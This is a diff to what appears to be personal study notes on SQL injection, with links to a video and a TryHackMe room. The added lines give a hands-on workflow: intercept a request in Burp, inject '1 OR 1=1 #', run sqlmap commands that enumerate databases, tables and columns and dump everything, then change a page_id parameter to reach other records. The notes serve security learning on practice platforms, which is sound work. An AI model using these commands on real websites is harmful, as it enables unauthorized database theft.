@@ -5,6 +5,16 @@ execution by a backend database.
 Resource:
 1. https://youtu.be/2OPVViV-GQk?si=_xyD1fmNSoAviZDD
 
+Find any input parameter on website and capture the request in burp and then use it to perform sql
+injection using sqlmap.
+Now open the burp and check the input parameters and intercept on then type some as “1 OR ANY TEXT”
+you get some value on burp copy that and create the txt file.(1 OR 1=1 #)
+sqlmap -r <txt file from burpsuite> --dbs
+sqlmap -r <txt file from burpsuite> -D <database name> --tables
+sqlmap -r <txt file from burpsuite> -D <database name> -T <table name> --columns
+sqlmap -r <txt file from burpsuite> -D <database name> -T <table name> --dump-all
+then login and do the url parameter change page_id=1 to page_id=84
+
 
 TRYHACKME ROOMS:
 1. https://tryhackme.com/room/sqlinjectionlm
